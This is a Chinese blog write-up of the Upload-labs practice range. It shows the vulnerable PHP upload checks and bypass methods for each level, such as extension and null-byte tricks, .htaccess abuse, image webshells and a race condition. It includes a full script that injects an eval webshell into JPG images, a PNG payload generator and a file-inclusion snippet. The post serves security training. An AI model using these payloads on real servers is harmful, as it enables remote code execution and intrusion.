{"meta":{"title":"DD's Blog","subtitle":null,"description":null,"author":"DD","url":"https://ddstick.github.io","root":"/"},"pages":[],"posts":[{"title":"Upload-labs","slug":"Upload-labs","date":"2019-07-31T00:19:52.000Z","updated":"2019-08-01T10:52:13.232Z","comments":true,"path":"2019/07/31/Upload-labs/","link":"","permalink":"https://ddstick.github.io/2019/07/31/Upload-labs/","excerpt":"","text":"文件上传漏洞练习Upload-labs是一个帮你总结各种类型的上传漏洞的靶场，包括常见的文件上传漏洞项目地址：https://github.com/c0ny1/upload-labs Summary 构造优质上传漏洞Fuzz字典http://www.hacksec.cn/Tools/866.html Pass-01 js检查直接上传php木马，发现前端报错： 在这使用传统的抓包，修改后缀名。是可以上传成功的，但是不是这一关的目的，我们看看源代码分析一波 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 可以看到，只是在客户端使用js对不合法图片进行检查，我们可以尝试绕过 如果是前端验证我们可以选择火狐浏览器中的NoScript插件禁用js,这样我们就可以安全的上传 但对于前端的过滤没有必要这么复杂，其实，还可以这样，直接把过滤的函数cheakfile()在上传前删掉，也可以上传成功 或者修改参数 在白名单中加上.php 复制该函数于控制台并回车 随后即可成功上传 Pass-02 验证Content-type本题中使用传统的抓包，单纯修改后缀名是不行的查看源码观察一下： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 基础姿势：12345$_FILES[\"file\"][\"name\"] – 被上传文件的名称$_FILES[\"file\"][\"type\"] – 被上传文件的类型$_FILES[\"file\"][\"size\"] – 被上传文件的大小，以字节计$_FILES[\"file\"][\"tmp_name\"] – 存储在服务器的文件的临时副本的名称$_FILES[\"file\"][\"error\"] – 由文件上传导致的错误代码 123456move_uploaded_file(file,newloc) 函数将上传的文件移动到新位置。参数 描述file 必需。规定要移动的文件。newloc 必需。规定文件的新位置。如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。 发现只是对文件类型Content-type进行过虑于是上传xxx.php文件抓包修改content-type为image/jpeg或其他绕过 修改为： 点击Forward发送 Pass-03 黑名单绕过不能上传，但能上传 php.jpg，php.asd 说明是黑名单限制 发现是黑名单判断，服务器端禁止上传’.asp’,’.aspx’,’.php’,’.jsp’后缀的脚本文件其采用的黑名单，php的话有时候php3、php4、php5、phtml、pht这些后缀也是可以被解析的（配置的原因），其他语言也有类似的情况，需要尝试： 上传木马抓包 修改文件名后缀（配置不同，可解析的后缀也不同）： Pass-04 .htaccess绕过上传.htaccess文件需要：|1.mod_rewrite模块开启|2.AllowOverride All| 该题的源码为： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 发现同样有黑名单过滤，但是发下有一个文件是没有过滤，也是我们上传过程中经常用到的.htaccess .htaccess重点姿势.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。它里面有这样一段代码：AllowOverride None，如果我们把None改成All 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 可以通过上传.htaccess文件然后将该文件夹下的所有例如.jpg的文件都按照脚本语言解析，上传如下内容的.htaccess文件： 意思是将文件夹下的one.jpg文件按照php格式去解析，然后再上传一个文件名为one.jpg内容为木马的文件，然后访问，可以执行代码（其中.jpg也可换成test等其他，但其他也需改变） 或 或 这样所有文件都会解析为php 上传成功后，在上传个图片马： 发现成功上传，可以访问一下，发现成功执行： Pass-05 大小写绕过——Windows拿源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到在第五关代码中没有这个 1$file_ext = strtolower($file_ext); //转换为小写 所以我们可以通过大小写进行绕过了： 抓包： 回显： Pass-06 空格绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这一关比第五关少了这样的一句代码 1$file_ext = trim($file_ext); //首尾去空 所以可以后缀名+空格的形式去绕过,抓包 修改： Pass-07 点绕过——Windows源码如下： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 查看代码发现，大小写，空格，等等都是绕不过的，但是还有一个在后缀名中家点号没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，上传后文件名后缀的点会被去除，所以可在后缀名中加”.”绕过，走起： Pass-08 ::$DATA绕过——Windows这一题的代码比上一次少了下面这一段代码 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 这个是关于windows下文件的流特性，可以参考一下这篇文章https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream在后缀添加::$DATA 即可绕过上传1.php::$DATA之后会变成1.php NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 上传xxx.php::$DATA绕过。(仅限windows) Pass-09 点空格点绕过——Windows这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样 1234567$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 可以遵循着他的步骤去实现自己的payload，可以设置为pass09.php. . 这样一来检测到最后的文件名是pass09.php.，这样就相当于第七关了 Pass-10 双写绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 关键函数解析123456str_ireplace(find,replace,string,count)参数 描述find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。一个变量，对替换数进行计数。 上面的代码依旧是黑名单过滤，这里是将文件后缀名替换为空，只替换了一次 1234567&lt;?php$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");$file_name = str_ireplace($deny_ext,\"\", 'pphphp');var_dump($file_name);#绕过测试代码?&gt; Pass-11 00截断GET方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 关键函数解析1234567891011121314strrpos()定义和用法strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。注释：strrpos() 函数对大小写敏感。相关函数：stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）语法strrpos(string,find,start)参数 描述string 必需。规定被搜索的字符串。find 必需。规定要查找的字符。start 可选。规定在何处开始搜索。 1234567substr()这里写代码片语法substr(string,start,length)参数 描述string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 test: 123456&lt;?php$a = '1.jpg';$file_ext = substr($a,strrpos($a,\".\")+1);var_dump($file_ext);?&gt;返回jpg 分析代码： 1$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext; 发现那个路径没有处理直接拼接上去的。所以可以利用00截断绕过。但是发现怎么截断都没有用。查阅资料： 123截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的magic_quotes_gpc为OFF状态 解决后，抓包 请求中会自动将%00进行url解码，在后台进行拼凑的时候会自动阶段后面的字符串上传成功后的文件名即为你修改的名 Pass-12 00截断POST方式123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 该题也是00截断，只不过由于文件路径这个参数是通过post请求发送的，需要抓包后再hex中修改，因为post不会像get对%00进行自动解码 1$img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; save_path 从 GET 变成了 POST, 此时不能再使用 %00 截断, 原因是 %00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.这里把 2b(‘+’的 hex) 修改成 00 或者把 20(‘空格’的hex)修改为00 这里的路径 1.php+或1.php 都可 需自己手动加上 完成发送即可上传 Pass-13 图片马通过上传图片马，再利用本地包含漏洞执行 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可图片马制作方法,cmd中执行： 123copy one.jpg /b + one.php /a one.jpg/b:指定二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件，用于txt等文本累文件 或 利用16进制编辑器在图片的编辑栏末尾加上木马 成功上传，而且得到文件的名称。我们后期如果存在文件包含漏洞就可以利用 比如我们简单写一个存在文件包含漏洞的页面: 123456&lt;?php$file = $_GET[ 'page' ];include($file);?&gt; 发现可以成功利用漏洞： Pass-14 图片马getimagsize函数12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 关键代码： 1234$types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); 这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过， 知识补充点：1234array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 同样用上一关的图片木马进行上传也可成功利用方式和上一关一样，需要文件包含漏洞 Pass-15 图片马php_exif本关还是要上传一个图片马，这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过就不多说。 Pass-16 图片马二次渲染因为上传显示的的图片是二次渲染后生成的新图片，所以之前插入在图片中的代码会被过滤掉，因此上述的图片马无法实现 不同图片不同的绕过方法： gif：先把gif上传后，取出该文件与未修改的文件进行对比 蓝色部分内容为未改变的部分，因此可在蓝色部分中插入木马上传绕过 再上传 被修改的内容未被过滤，成功绕过，再结合文件包含漏洞 jpg：过于复杂，利用脚本处理得到上传图片： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?php eval($_POST['DD']); ?&gt;\";//插入的恶意代码 if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 但有一些jpg图片不能被处理,所以要多尝试一些jpg图片使用脚本处理1.jpg 得到 用16进制编辑器查看 生成的图片中已插入php代码上传该图片码后，插入的php代码未被过滤 png:同样使用脚本处理图片: 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 得到 16进制编辑器查看 php代码已插入代码的使用：url： post: 相当于执行命令system(ipconfig) 本关还是要上传一个图片马。 1234567imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。该系列函数有：imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 Pass-17 条件竞争1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 在if判读不通过unlink文件之前已经用move_uploaded_file函数将文件上传到upload目录下，所以通过bp不断的上传weshell，然后在浏览器中不断的访问总能访问到未被unlink的webshell文件 这里可以使用burp去发包， 即用Burp不断上传，再用burp不断访问 ，在burp中不断发送上传webshell的数据包，可以把文件内容改成下面这样 （就是为了写文件进去就对了） 